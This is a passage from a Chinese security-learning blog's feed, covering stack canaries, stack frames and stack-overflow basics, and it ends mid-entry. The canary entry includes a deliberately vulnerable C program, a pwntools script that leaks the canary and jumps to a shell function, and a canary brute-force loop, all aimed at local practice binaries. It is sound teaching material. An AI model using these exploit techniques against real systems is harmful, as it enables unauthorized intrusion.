    <category term="3-No-execute" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/3-No-execute/"/>
    
    
  </entry>
  
  <entry>
    <title>Canary</title>
    <link href="https://rhea006.github.io/2025/07/627686b41f6e.html"/>
    <id>https://rhea006.github.io/2025/07/627686b41f6e.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">plaintext</span><br><span class="line"></span><br><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SS</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="6-Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="2-Stack Canaries" scheme="https://rhea006.github.io/categories/PWN/Learning/6-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2-Stack-Canaries/"/>
    
    
  </entry>
  
  <entry>
    <title>1-栈介绍</title>
    <link href="https://rhea006.github.io/2025/07/fa6880b0859f.html"/>
    <id>https://rhea006.github.io/2025/07/fa6880b0859f.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-04T09:53:35.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h1><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/../../../../../../images/image-20250701104727634.png" alt="image-20250701104727634"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong><code>程序的栈是从进程地址空间的高地址向低地址增长的</code></strong>。</p><h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="栈指针-SP"><a href="#栈指针-SP" class="headerlink" title="栈指针 (SP)"></a>栈指针 (SP)</h3><ul><li>x86: ESP (32位), x64: RSP (64位)</li><li>始终指向栈顶位置</li><li><code>push/pop</code> 指令自动修改 SP</li></ul><h3 id="基址指针-BP"><a href="#基址指针-BP" class="headerlink" title="基址指针 (BP)"></a>基址指针 (BP)</h3><ul><li>x86: EBP, x64: RBP</li><li>作为当前栈帧的基准点</li><li>用于定位参数和局部变量</li></ul><h3 id="指令指针-IP"><a href="#指令指针-IP" class="headerlink" title="指令指针 (IP)"></a>指令指针 (IP)</h3><ul><li>x86: EIP, x64: RIP</li><li>存储下一条执行指令地址</li><li><code>call/ret</code> 指令修改 IP</li></ul><h2 id="函数调用过程（关键！）"><a href="#函数调用过程（关键！）" class="headerlink" title="函数调用过程（关键！）"></a>函数调用过程（关键！）</h2><h3 id="调用者-Caller-准备"><a href="#调用者-Caller-准备" class="headerlink" title="调用者 (Caller) 准备"></a>调用者 (Caller) 准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 参数压栈（从右向左）</span><br><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">; 2. 调用函数</span><br><span class="line">call function  ; 自动压入返回地址(EIP/RIP)</span><br></pre></td></tr></table></figure><h3 id="被调函数-Callee-序言"><a href="#被调函数-Callee-序言" class="headerlink" title="被调函数 (Callee) 序言"></a>被调函数 (Callee) 序言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function:</span><br><span class="line">; 1. 保存调用者栈帧</span><br><span class="line">push ebp        ; 保存旧EBP</span><br><span class="line">; 2. 建立新栈帧</span><br><span class="line">mov ebp, esp    ; EBP = 当前ESP</span><br><span class="line">; 3. 分配局部变量空间</span><br><span class="line">sub esp, 0x20   ; 分配32字节空间</span><br></pre></td></tr></table></figure><h3 id="栈帧内存布局（32位示例）"><a href="#栈帧内存布局（32位示例）" class="headerlink" title="栈帧内存布局（32位示例）"></a>栈帧内存布局（32位示例）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数3        | [ebp + 16]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数2        | [ebp + 12]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数1        | [ebp + 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|    返回地址      | [ebp + 4]  ← 漏洞利用关键点！</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的EBP       | &lt;-- EBP (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量1     | [ebp - 4]</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量2     | [ebp - 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|     ...         | </span><br><span class="line">+-----------------+</span><br><span class="line">|    临时空间      | &lt;-- ESP (栈顶)</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="函数返回过程"><a href="#函数返回过程" class="headerlink" title="函数返回过程"></a>函数返回过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 返回值存入EAX（约定）</span><br><span class="line">mov eax, return_value</span><br><span class="line">; 2. 释放局部空间</span><br><span class="line">mov esp, ebp    ; ESP = EBP</span><br><span class="line">; 3. 恢复调用者栈帧</span><br><span class="line">pop ebp         ; 恢复旧EBP</span><br><span class="line">; 4. 返回到调用者</span><br><span class="line">ret             ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><h1 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h1><p>寄存器的图</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/figure/register.png" alt="img"></p><p><code>需要注意的是，32 位和 64 位程序有以下简单的区别:</code></p><ul><li><p><code>x86</code></p><ul><li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 参数N     | ← EBP + 4*(N+1)</span><br><span class="line">| ...      |</span><br><span class="line">| 参数2     | ← EBP + 12</span><br><span class="line">| 参数1     | ← EBP + 8</span><br><span class="line">| 返回地址   | ← EBP + 4</span><br><span class="line">| 保存的EBP  | ← EBP</span><br><span class="line">| 局部变量   | ← EBP - 4</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>x64</code></p><ul><li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p></li><li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p></li><li><p><strong>栈帧布局</strong>：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">| 额外参数N  | ← RBP + 8*(N+1)</span><br><span class="line">| ...       |</span><br><span class="line">| 额外参数1  | ← RBP + 16</span><br><span class="line">| 返回地址    | ← RBP + 8</span><br><span class="line">| 保存的RBP  | ← RBP</span><br><span class="line">| 局部变量    | ← RBP - 8</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本栈介绍&quot;&gt;&lt;a href=&quot;#基本栈介绍&quot; class=&quot;headerlink&quot; title=&quot;基本栈介绍&quot;&gt;&lt;/a&gt;基本栈介绍&lt;/h1&gt;&lt;p&gt;栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 </summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="5-栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    <category term="x86x64" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/"/>
    
    
  </entry>
  
  <entry>
    <title>2-栈溢出原理</title>
    <link href="https://rhea006.github.io/2025/07/e846fd6fd950.html"/>
    <id>https://rhea006.github.io/2025/07/e846fd6fd950.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-03T13:19:23.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>我们利用如下命令对其进行编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  gcc -m32 -fno-stack-protector stack_example.c -o stack_example -no-pie</span><br><span class="line">stack-example.c: In <span class="keyword">function</span> <span class="string">&#x27;vulnerable&#x27;</span>:</span><br><span class="line">stack-example.c:8:5: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;gets&#x27;</span>; did you mean <span class="string">&#x27;fgets&#x27;</span>? [-Wimplicit-function-declaration]</span><br><span class="line">    8 |     gets(s);</span><br><span class="line">      |     ^~~~</span><br><span class="line">      |     fgets</span><br><span class="line">/usr/bin/ld: /tmp/ccevu0Fc.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">stack-example.c:(.text+0x45): warning: the `gets&#x27;</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><blockquote><p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p></blockquote><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec stack_example</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 